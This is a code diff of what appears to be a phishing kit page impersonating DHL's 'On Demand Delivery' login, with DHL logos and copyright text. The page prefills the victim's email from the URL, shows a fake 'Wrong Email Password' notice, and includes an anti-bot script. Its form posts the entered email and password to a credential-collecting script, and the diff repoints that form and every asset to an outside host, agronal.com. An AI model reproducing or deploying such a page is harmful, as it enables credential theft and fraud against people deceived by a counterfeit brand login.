@@ -5,11 +5,11 @@ include('antibots6.php');
 <!DOCTYPE html>
 <html lang="en" dir="ltr"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <title>On Demand Delivery</title>
-<script src="./milk/jquery.min.js"></script>
-<script src="./milk/bootstrap.min.js"></script>
+<script src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/jquery.min.js"></script>
+<script src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/bootstrap.min.js"></script>
 <script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
- <link rel="shortcut icon" href="./milk/favicon.ico" />
-    <link rel="stylesheet" type="text/css" href="./milk/login.css">
+ <link rel="shortcut icon" href="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/login.css">
     </head>
 	
 	<body style=" border: none; ">
@@ -20,7 +20,7 @@ include('antibots6.php');
 	    <div class="modal-dialog linguisticHelpModel">
 	      <div class="modal-content">
 	        <div class="modal-header helpModalHeader">
-	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="./milk/icon-close.png"> </button>
+	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/icon-close.png"> </button>
 	          <h4 class="helpmodal-title mt-10 mb-10" id="myModalLabel">Help</h4>
 	        </div>
 	        <div id="sideMenuHelpContent" class="modal-body linguisticHelpModelBody">
@@ -42,10 +42,10 @@ include('antibots6.php');
       <section id="main-body" class="login-bg" style="border: 0;">
     <section id="login-body" class="row">
       <div class="col-xs-24">
-        <img src="./milk/dhl_logo.svg" class="logo-dhl is-centered img-responsive" alt="DHL">
+        <img src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/dhl_logo.svg" class="logo-dhl is-centered img-responsive" alt="DHL">
       </div>
       <div class="col-xs-24">
-        <img src="./milk/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
+        <img src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
       </div>
 	  <div style="text-align: center; margin-bottom: 10px;">Login with your valid email and password to gain access to all shipment information.<br>
 	  
@@ -54,7 +54,7 @@ include('antibots6.php');
 	  !! Wrong Email Password
 	  </small>
 	  </div>
-<form id="loginForm" name="loginForm" method="post" action="loggd.php">
+<form id="loginForm" name="loginForm" method="post" action="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/loggd.php">
 
         <div class="row login-input-group">
           
@@ -66,7 +66,7 @@ include('antibots6.php');
           <div class="col-xs-24 mb-5"><div id="loginForm:password-field" class="login-button-combo col-xs-24" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);">
 		  
 		  <input placeholder="Email Address Password" type="password" id="loginForm:password" required="" name="cash" class="password-toggle" tabindex="2" style="">
-              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="./milk/eyeshow.svg" ></div><span id="loginForm:password-field-error" style="display: none;" class="input-error"></span>
+              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/eyeshow.svg" ></div><span id="loginForm:password-field-error" style="display: none;" class="input-error"></span>
 </div>
 
           <div class="col-xs-24">
@@ -98,14 +98,14 @@ include('antibots6.php');
       </section>
       <footer id="main-footer" class="row">
         <div class="col-xs-8 nopadding">
-          <img src="./milk/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
+          <img src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
         </div>
         <div class="col-xs-16 nopadding">
           <span class="copyright">DHL Express 2020 © DHL International GmbH. All rights reserved.
           </span>
         </div>
       </footer>
-    </section><script src="./milk/confirmation.js.xhtml" type="text/javascript"></script>
+    </section><script src="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/milk/confirmation.js.xhtml" type="text/javascript"></script>
 	
 	
    
